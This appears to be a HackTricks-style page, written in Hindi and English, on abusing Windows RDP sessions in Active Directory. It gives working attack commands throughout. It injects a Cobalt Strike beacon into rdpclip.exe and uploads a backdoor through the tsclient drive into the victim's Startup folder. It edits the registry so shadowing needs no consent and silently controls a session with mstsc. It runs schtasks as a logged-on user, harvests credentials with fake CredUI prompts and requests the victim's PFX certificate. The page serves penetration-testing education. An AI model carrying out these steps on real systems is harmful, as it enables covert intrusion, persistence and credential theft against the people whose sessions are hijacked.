# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

यदि **external group** के पास current domain के किसी भी **computer** पर **RDP access** है, तो एक **attacker** उस **computer** को **compromise** करके उसका इंतज़ार कर सकता है।

जब वह user RDP के माध्यम से access कर लेता है, तो **attacker उस user के session में pivot** कर सकता है और external domain में उसकी permissions का abuse कर सकता है।
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
अन्य tools से sessions चुराने के **अन्य तरीकों** को [**इस पेज पर देखें।**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

यदि कोई user **RDP के जरिए किसी machine में access** करता है, जहाँ कोई **attacker** उसका इंतज़ार कर रहा हो, तो attacker user के **RDP session में beacon inject** कर सकेगा और यदि **victim ने RDP के जरिए access करते समय अपनी drive mount की हो**, तो **attacker उसे access कर सकता था**।

इस मामले में आप केवल **victims** के **original computer** को **compromise** कर सकते थे, **statup folder** में एक **backdoor** लिखकर।
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

यदि आप ऐसे host पर **local admin** हैं जहाँ victim का पहले से **active RDP session** है, तो आप **password चुराए बिना या LSASS dump किए बिना उस desktop को view/control** कर सकते हैं।<sup>[[1]](#references)</sup>

यह **Remote Desktop Services shadowing** policy पर निर्भर करता है, जो यहाँ stored होती है:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
दिलचस्प values:

- `0`: Disabled
- `1`: `EnableInputNotify` (control, user approval required)
- `2`: `EnableInputNoNotify` (control, **no user approval**)
- `3`: `EnableNoInputNotify` (view-only, user approval required)
- `4`: `EnableNoInputNoNotify` (view-only, **no user approval**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
यह विशेष रूप से तब उपयोगी होता है जब RDP के माध्यम से connected किसी privileged user ने unlocked desktop, KeePass session, MMC console, browser session या admin shell खुला छोड़ दिया हो।

## Logged-On User के रूप में Scheduled Tasks

यदि आप **local admin** हैं और target user **वर्तमान में logged on** है, तो Task Scheduler उस user के password के बिना **उस user के रूप में code** start कर सकता है।<sup>[[1]](#references)[[4]](#references)</sup>

यह victim के मौजूदा logon session को एक execution primitive में बदल देता है:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
नोट्स:

- यदि user **logged on नहीं है**, तो Windows को आमतौर पर उनके रूप में चलने वाला task बनाने के लिए password की आवश्यकता होती है।
- यदि user **logged on है**, तो task मौजूदा logon context का पुनः उपयोग कर सकता है।
- यह LSASS को छुए बिना victim session के अंदर GUI actions execute करने या binaries launch करने का व्यावहारिक तरीका है।

## Victim Session से CredUI Prompt Abuse

जब आप **victim के interactive desktop के अंदर** execute कर सकते हैं (उदाहरण के लिए **Shadow RDP** या **उस user के रूप में चलने वाले scheduled task** के माध्यम से), तब आप CredUI APIs का उपयोग करके एक **real Windows credential prompt** प्रदर्शित कर सकते हैं और victim द्वारा दर्ज किए गए credentials harvest कर सकते हैं।<sup>[[1]](#references)</sup>

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typical flow:

1. Victim session में एक binary spawn करें।
2. Current domain branding से मेल खाने वाला domain-authentication prompt प्रदर्शित करें।
3. लौटाए गए auth buffer को unpack करें।
4. दिए गए credentials को validate करें और valid credentials दर्ज होने तक आवश्यकता पड़ने पर prompt दिखाते रहें।

यह **on-host phishing** के लिए उपयोगी है, क्योंकि prompt किसी fake HTML form के बजाय standard Windows APIs द्वारा render किया जाता है।

## Victim Context में PFX Request करना

इसी **scheduled-task-as-user** primitive का उपयोग logged-on victim के रूप में **certificate/PFX request** करने के लिए किया जा सकता है। उस certificate का उपयोग बाद में उस user के रूप में **AD authentication** के लिए किया जा सकता है, जिससे password theft पूरी तरह avoid हो जाती है।<sup>[[1]](#references)[[5]](#references)</sup>

High-level flow:

1. ऐसे host पर **local admin** प्राप्त करें जहाँ victim logged on है।
2. **scheduled task** का उपयोग करके victim के रूप में enrollment/export logic चलाएँ।
3. परिणामी **PFX** export करें।
4. PKINIT / certificate-based AD authentication के लिए PFX का उपयोग करें।

Follow-up abuse के लिए AD CS pages देखें:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
